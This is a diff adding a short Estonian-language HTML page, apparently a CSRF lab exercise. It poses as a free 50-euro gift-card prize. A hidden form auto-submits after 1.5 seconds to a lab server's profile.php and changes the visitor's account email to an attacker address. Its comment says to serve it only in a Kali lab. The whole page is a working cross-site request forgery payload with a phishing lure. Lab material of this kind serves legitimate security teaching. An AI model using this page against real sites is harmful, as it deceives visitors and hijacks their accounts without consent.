@@ -1,0 +1,18 @@
+<!doctype html>
+<html lang="et">
+<head><meta charset="utf-8"><title>Tasuta kinkekaart!</title></head>
+<body>
+  <!-- CSRF-laborileht. Käivita AINULT laboris Kali masinas:
+       cd rundaja && python3 -m http.server 8001
+       Muuda vajadusel serveri IP-aadress. -->
+  <h1>Palju õnne! Võitsid 50 € kinkekaardi!</h1>
+  <p>Kinkekaarti valmistatakse ette...</p>
+
+  <form id="f" action="http://192.168.50.10:8000/profile.php" method="GET">
+    <input type="hidden" name="email" value="kaaperdatud@kurjam.labor">
+  </form>
+  <script>
+    setTimeout(function () { document.getElementById('f').submit(); }, 1500);
+  </script>
+</body>
+</html>
